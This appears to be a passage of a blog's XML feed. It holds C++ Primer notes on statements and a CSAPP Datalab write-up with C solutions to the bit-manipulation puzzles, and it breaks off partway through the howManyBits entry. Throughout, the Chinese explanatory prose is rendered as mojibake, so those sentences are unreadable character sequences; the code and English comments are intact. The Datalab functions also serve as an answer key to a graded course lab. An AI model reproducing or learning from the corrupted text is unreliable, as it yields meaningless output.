CSAPPï¼ˆåä¹ï¼‰ï¼šè¿™å¯èƒ½æ˜¯ä½ èƒ½æ‰¾åˆ°çš„åˆ†ææœ€å…¨çš„Bomblabäº† - Yannickçš„æ–‡ç«  - çŸ¥ä¹<a href="https://zhuanlan.zhihu.com/p/104130161">https://zhuanlan.zhihu.com/p/104130161</a></li><li>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ/CSAPPã€‹Bomb Lab - ä¸Šå²¸æ”¹åäº†çš„æ–‡ç«  - çŸ¥ä¹<a href="https://zhuanlan.zhihu.com/p/57977157">https://zhuanlan.zhihu.com/p/57977157</a></li><li><a href="https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/">https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬5ç«  è¯­å¥</title>
      <link href="/2023/05/24/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch05/"/>
      <url>/2023/05/24/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch05/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬5ç« -è¯­å¥">ç¬¬5ç«  è¯­å¥</h1><h2 id="ç®€å•è¯­å¥">ç®€å•è¯­å¥</h2><ul><li><strong>è¡¨è¾¾å¼è¯­å¥</strong>ï¼šä¸€ä¸ªè¡¨è¾¾å¼æœ«å°¾åŠ ä¸Šåˆ†å·ï¼Œå°±å˜æˆäº†è¡¨è¾¾å¼è¯­å¥ã€‚</li><li><strong>ç©ºè¯­å¥</strong>ï¼šåªæœ‰ä¸€ä¸ªå•ç‹¬çš„åˆ†å·ã€‚</li><li><strong>å¤åˆè¯­å¥ï¼ˆå—ï¼‰</strong>ï¼šç”¨èŠ±æ‹¬å· <code>&#123;&#125;</code>åŒ…è£¹èµ·æ¥çš„è¯­å¥å’Œå£°æ˜çš„åºåˆ—ã€‚ä¸€ä¸ªå—å°±æ˜¯ä¸€ä¸ªä½œç”¨åŸŸã€‚</li></ul><h2 id="æ¡ä»¶è¯­å¥">æ¡ä»¶è¯­å¥</h2><ul><li><strong>æ‚¬å‚else</strong>ï¼ˆdangling elseï¼‰ï¼šç”¨æ¥æè¿°åœ¨åµŒå¥—çš„<code>if else</code>è¯­å¥ä¸­ï¼Œå¦‚æœ<code>if</code>æ¯”<code>else</code>å¤šæ—¶å¦‚ä½•å¤„ç†çš„é—®é¢˜ã€‚C++ä½¿ç”¨çš„æ–¹æ³•æ˜¯<code>else</code>åŒ¹é…æœ€è¿‘æ²¡æœ‰é…å¯¹çš„<code>if</code>ã€‚</li></ul><h2 id="è¿­ä»£è¯­å¥">è¿­ä»£è¯­å¥</h2><ul><li><strong>while</strong>ï¼šå½“ä¸ç¡®å®šåˆ°åº•è¦è¿­ä»£å¤šå°‘æ¬¡æ—¶ï¼Œä½¿ç”¨ <code>while</code>å¾ªç¯æ¯”è¾ƒåˆé€‚ï¼Œæ¯”å¦‚è¯»å–è¾“å…¥çš„å†…å®¹ã€‚</li><li><strong>for</strong>ï¼š <code>for</code>è¯­å¥å¯ä»¥çœç•¥æ‰ <code>init-statement</code>ï¼Œ <code>condition</code>å’Œ <code>expression</code>çš„ä»»ä½•ä¸€ä¸ªï¼›<strong>ç”šè‡³å…¨éƒ¨</strong>ã€‚</li><li><strong>èŒƒå›´for</strong>ï¼š <code>for (declaration: expression) statement</code></li></ul><h2 id="è·³è½¬è¯­å¥">è·³è½¬è¯­å¥</h2><ul><li><strong>break</strong>ï¼š<code>break</code>è¯­å¥è´Ÿè´£ç»ˆæ­¢ç¦»å®ƒæœ€è¿‘çš„<code>while</code>ã€<code>do while</code>ã€<code>for</code>æˆ–è€…<code>switch</code>è¯­å¥ï¼Œå¹¶ä»è¿™äº›è¯­å¥ä¹‹åçš„ç¬¬ä¸€æ¡è¯­å¥å¼€å§‹ç»§ç»­æ‰§è¡Œã€‚</li><li><strong>continue</strong>ï¼šç»ˆæ­¢æœ€è¿‘çš„å¾ªç¯ä¸­çš„å½“å‰è¿­ä»£å¹¶ç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡è¿­ä»£ã€‚åªèƒ½åœ¨<code>while</code>ã€<code>do while</code>ã€<code>for</code>å¾ªç¯çš„å†…éƒ¨ã€‚</li></ul><h2 id="tryè¯­å¥å—å’Œå¼‚å¸¸å¤„ç†">tryè¯­å¥å—å’Œå¼‚å¸¸å¤„ç†</h2><ul><li><strong>throwè¡¨è¾¾å¼</strong>ï¼šå¼‚å¸¸æ£€æµ‹éƒ¨åˆ†ä½¿ç”¨ <code>throw</code>è¡¨è¾¾å¼æ¥è¡¨ç¤ºå®ƒé‡åˆ°äº†æ— æ³•å¤„ç†çš„é—®é¢˜ã€‚æˆ‘ä»¬è¯´ <code>throw</code>å¼•å‘ <code>raise</code>äº†å¼‚å¸¸ã€‚</li><li><strong>tryè¯­å¥å—</strong>ï¼šä»¥ <code>try</code>å…³é”®è¯å¼€å§‹ï¼Œä»¥ä¸€ä¸ªæˆ–å¤šä¸ª <code>catch</code>å­—å¥ç»“æŸã€‚ <code>try</code>è¯­å¥å—ä¸­çš„ä»£ç æŠ›å‡ºçš„å¼‚å¸¸é€šå¸¸ä¼šè¢«æŸä¸ª <code>catch</code>æ•è·å¹¶å¤„ç†ã€‚ <code>catch</code>å­å¥ä¹Ÿè¢«ç§°ä¸º<strong>å¼‚å¸¸å¤„ç†ä»£ç </strong>ã€‚</li><li><strong>å¼‚å¸¸ç±»</strong>ï¼šç”¨äºåœ¨ <code>throw</code>è¡¨è¾¾å¼å’Œç›¸å…³çš„ <code>catch</code>å­å¥ä¹‹é—´ä¼ é€’å¼‚å¸¸çš„å…·ä½“ä¿¡æ¯ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> ã€ŠC++ Primer 5thã€‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-Datalabè¯¦è§£</title>
      <link href="/2023/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l1-datalab/"/>
      <url>/2023/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l1-datalab/</url>
      
        <content type="html"><![CDATA[<p><a href="http://csapp.cs.cmu.edu/im/labs/datalab.tar"><em>Data Lab</em></a> <em><strong>[Updated 12/16/19]</strong></em> (<a href="http://csapp.cs.cmu.edu/3e/README-datalab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/datalab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/datalab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/datalab-handout.tar">Self-Study Handout</a>)</p><blockquote><p>Students implement simple logical, twoâ€™s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><p>å®éªŒä½œä¸šç½‘å€ï¼š<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><hr><h1 id="bitXor">bitXor</h1><p>æ€è·¯ï¼šå…ˆä½¿ç”¨<code>&amp;</code>ã€<code>|</code>ã€<code>~</code>è¿›è¡Œè¡¨ç¤ºï¼Œç„¶ååˆ©ç”¨DeMorganå¾‹å»æ›¿æ¢æ‰ä¸èƒ½ä½¿ç”¨çš„ä½è¿ç®—ã€‚</p><p>å…ˆç”»å‡ºçœŸå€¼è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x y  x^y</span><br><span class="line">0 0   0</span><br><span class="line">0 1   1</span><br><span class="line">1 0   1</span><br><span class="line">1 1   0</span><br><span class="line"></span><br><span class="line">x y  x|y</span><br><span class="line">0 0   0</span><br><span class="line">0 1   1</span><br><span class="line">1 0   1</span><br><span class="line">1 1   1</span><br><span class="line"></span><br><span class="line">x y  x&amp;y</span><br><span class="line">0 0   0</span><br><span class="line">0 1   0</span><br><span class="line">1 0   0</span><br><span class="line">1 1   1</span><br></pre></td></tr></table></figure><h2 id="æ€è·¯1ï¼šçœ‹ä»€ä¹ˆæƒ…å†µå¾—åˆ°1">æ€è·¯1ï¼šçœ‹ä»€ä¹ˆæƒ…å†µå¾—åˆ°1</h2><p>â€œxä¸º0ï¼Œyä¸º1â€œæˆ–â€xä¸º1ï¼Œyä¸º0â€å³å¯ï¼š<code>x^y = (x&amp;~y) | (~x&amp;y)</code></p><p>æ ¹æ®DeMorganå¾‹ï¼š<code>x|y = ~(~x &amp; ~y)</code></p><p>å³ <code>x^y = (x&amp;~y) | (~x&amp;y) = ~(~(x&amp;~y) &amp; ~(~x&amp;y))</code></p><h2 id="æ€è·¯2ï¼šæ’é™¤æ‰å¾—åˆ°0çš„æƒ…å†µ">æ€è·¯2ï¼šæ’é™¤æ‰å¾—åˆ°0çš„æƒ…å†µ</h2><p>åªè¦xã€yä¸åŒæ—¶ä¸º0ï¼Œæˆ–åŒæ—¶ä¸º1å°±è¡Œï¼š<code>x^y = ~(~x&amp;~y) &amp; ~(x&amp;y)</code></p><h2 id="æ€è·¯3ï¼š-å’Œ-åƒï¼Œå†ç”¨-x-y-åŠ æ©ç ">æ€è·¯3ï¼š^å’Œ|åƒï¼Œå†ç”¨~(x&amp;y)åŠ æ©ç </h2><p><code>x^y = x|y &amp; ~(x&amp;y)</code></p><p>åˆ©ç”¨DeMorganå¾‹ï¼Œå¾—<code>x^y = ~(~x&amp;~y) &amp; ~(x&amp;y)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// return ~(~(x&amp;~y) &amp; ~(~x&amp;y));  // æ€è·¯1, 8æ¬¡op</span></span><br><span class="line">  <span class="keyword">return</span> ~(x&amp;y) &amp; ~(~x&amp;~y);  <span class="comment">// æ€è·¯2å’Œ3ï¼Œ7æ¬¡op</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Tmin">Tmin</h1><p>Tminå½¢å¦‚1000000000ï¼Œå¯é€šè¿‡ç§»ä½è¡¨ç¤ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">tmin</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x80</span> &lt;&lt; <span class="number">24</span>;  <span class="comment">// æŠŠé«˜ä½çš„24ä½ç§»æ‰</span></span><br><span class="line">  <span class="comment">// return 0x01 &lt;&lt; 31;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isTmax">isTmax</h1><p>Tmaxå½¢å¦‚0111111â€¦111ï¼Œç‰¹ç‚¹ï¼š<strong>~(Tmax+1)=Tmax</strong>ï¼Œå¯é€šè¿‡è¿™ä¸ªæ€§è´¨åˆ¤æ–­</p><p>ä½†æ˜¯Umax = 1111111â€¦111ä¹Ÿæ»¡è¶³ ~(Umax+1)=Umaxï¼Œéœ€è¦æ’é™¤</p><p>äºŒè€…ä¸åŒåœ¨äºTmax+1ä¸ä¸º0ï¼Œè€Œ<strong>Umax+1ç­‰äº0</strong>ï¼Œâ€æ˜¯å¦ç­‰äº0â€œå¯ä»¥é€šè¿‡<code>!!</code>è½¬åŒ–ä¸ºå¸ƒå°”ç±»å‹ï¼Œå¦åˆ™ç›´æ¥&amp;çš„è¯ä¸å¯¹å–”ã€‚</p><blockquote><p>ğŸ’¡é€šè¿‡ <code>!(x ^ y)</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰<br>é€šè¿‡ <code>!</code> æˆ– <code>!!</code> å°†ç»“æœè½¬åŒ–ä¸ºboolç±»å‹</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isTmax</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~(x+<span class="number">1</span>))^x) &amp; !!(x+<span class="number">1</span>);  <span class="comment">// 8ops</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="addOddBits">addOddBits</h1><p>é¦–å…ˆäº§ç”Ÿ1010â€¦1010 å³ 0xAAAAAAAA å½¢å¼çš„æ©ç ï¼Œå¯¹xçš„å¥‡æ•°ä½è¿›è¡Œæå–ï¼Œç„¶ååˆ¤æ–­æå–ç»“æœæ˜¯å¦ä¸º0xAAAAAAAAã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> AA = <span class="number">0xAA</span>;</span><br><span class="line">  <span class="type">int</span> AAAA = AA &lt;&lt; <span class="number">8</span> | AA;</span><br><span class="line">  <span class="type">int</span> AAAAAAAA = AAAA &lt;&lt; <span class="number">16</span> | AAAA;</span><br><span class="line">  <span class="keyword">return</span> !((x &amp; AAAAAAAA) ^ AAAAAAAA);  <span class="comment">// 7ops</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="negate">negate</h1><blockquote><p>ğŸ’¡ æ±‚è´Ÿï¼šé€ä½å–åå†åŠ 1</p></blockquote><p><img src="/2023/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l1-datalab/Untitled.png" alt="Untitled"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">negate</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isAsciiDigit">isAsciiDigit</h1><p>0x30 ä½æ¨¡å¼ä¸º <code>00â€¦00 0011 0000</code></p><p>0x39 ä½æ¨¡å¼ä¸º <code>00â€¦00 0011 1001</code></p><p>å¯ä»¥åˆ†æˆä¸¤æ­¥æ¥åˆ¤æ–­ï¼š</p><ol><li>å‰24ä½ä¸º 00â€¦00 0011</li><li>å8ä½èŒƒå›´ä¸º 0000-1001ï¼Œåˆ¤æ–­æ–¹æ³•ä¸ºå‡å»1010åï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºè´Ÿæ•°</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0b11</span>);</span><br><span class="line">  <span class="type">int</span> sub_res = (x &amp; <span class="number">0xF</span>) + (~<span class="number">0xA</span> + <span class="number">1</span>);  <span class="comment">// ä¸€å®šè¦åŠ æ‹¬å· &amp;ä¼˜å…ˆçº§æ¯”+/-ä½</span></span><br><span class="line">  <span class="type">int</span> cond2 = (sub_res &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> cond1 &amp; cond2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="conditional">conditional</h1><p>ç»“æœä¸€å®šå½¢å¦‚ï¼š<code>return (expr &amp; y) | (~expr &amp; z);</code></p><p>å½“x=0æ—¶ï¼Œexpr = 0, ~expr = 11â€¦11</p><p>å½“xâ‰ 0æ—¶ï¼Œexpr = 11â€¦11, ~exp = 0</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// x =  0, mask = 00000000</span></span><br><span class="line">  <span class="comment">// x != 0, mask = 11111111</span></span><br><span class="line">  <span class="type">int</span> mask = !!(x) &lt;&lt; <span class="number">31</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> (mask &amp; y) | (~mask &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isLessOrEqual">isLessOrEqual</h1><p>ç›´æ¥æƒ³æ³•æ˜¯åšå‡æ³•ï¼Œåˆ¤æ–­å·®çš„ç¬¦å·ã€‚<br>ä½†æ³¨æ„ï¼Œåªæœ‰åŒå·æ—¶åš+/-æ‰ä¸ç”¨è€ƒè™‘æº¢å‡ºï¼Œå…¶ä»–æƒ…å†µéƒ½éœ€è¦å•ç‹¬åˆ¤æ–­ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">isLessOrEqual ç­‰ä»·äº x &lt;= y ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">ç„¶åå»çœ‹ä»€ä¹ˆæ ·çš„æƒ…å†µä¸‹è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> x == y</span><br><span class="line">cond1 = !(x ^ y);</span><br><span class="line"></span><br><span class="line">sign_x = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span></span><br><span class="line">sign_y = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span></span><br><span class="line"><span class="number">2</span> x + y -</span><br><span class="line">cond2 = !(!sign_x &amp; sign_y)  å¤–å±‚!è¡¨ç¤ºx+ y-ä¸è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> x - y +</span><br><span class="line">cond3 = sign_x &amp; !sign_y</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> x - y - æ­¤æ—¶åšå‡æ³•æ‰ä¸ä¼šæº¢å‡º</span><br><span class="line"><span class="type">int</span> cond4 = (x + ~y + <span class="number">1</span>) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cond1 | (cond2 &amp; (cond3 | cond4))  ä¸æ»¡è¶³x+ y-å¹¶ä¸”...</span><br></pre></td></tr></table></figure><p>ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !(x ^ y);</span><br><span class="line">  <span class="type">int</span> sign_x = x &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> sign_y = y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> cond2 = !(~sign_x &amp; sign_y);</span><br><span class="line">  <span class="type">int</span> cond3 = sign_x &amp; ~sign_y;</span><br><span class="line">  <span class="type">int</span> cond4 = (x + ~y + <span class="number">1</span>) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> cond1 | (cond2 &amp; (cond3 | cond4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ ä¼˜å…ˆçº§ï¼š ! ~ + &lt;&lt; &amp; |</p></blockquote><h1 id="logicalNeg">logicalNeg</h1><p>å…³é”®ï¼šæ‰¾å‡º0å’Œé0æ•°çš„å…³ç³»ï¼Œé0æ•°æœ‰æ­£è´Ÿï¼Œx|(-x)çš„ç¬¦å·ä½ä¸€å®šä¸º1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> neg_x = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> sign_x = (x | neg_x) &gt;&gt; <span class="number">31</span>;  <span class="comment">// 0å¾—åˆ°0ï¼Œé0å¾—åˆ°11..11</span></span><br><span class="line">  <span class="keyword">return</span> sign_x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="howManyBits">howManyBits</h1><ul><li>0 åªéœ€è¦1ä½è¡¨ç¤º</li><li>è´Ÿæ•°ï¼Œå¯¹äº-1ï¼ˆ111, 11111, 111111ï¼‰éƒ½æ˜¯åªéœ€è¦1ä½è¡¨ç¤º<ul><li>å¯¹äºæ›´ä¸€èˆ¬çš„ 1110 0011, éœ€è¦1ä½è¡¨ç¤ºç¬¦å·ï¼Œç„¶åå°†æœ€é«˜ä½0çš„ä½æ•°å‘½åä½high_bitï¼Œåˆ™éœ€è¦high_bit + 1ä½è¡¨ç¤ºï¼ˆå¯ä»¥é€šè¿‡å–åï¼Œçœ‹æœ€é«˜ä½1ç¡®å®šhigh_bitï¼‰<br>ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼š1ä½ç¬¦å·ä½+æ•°å€¼çš„æ— 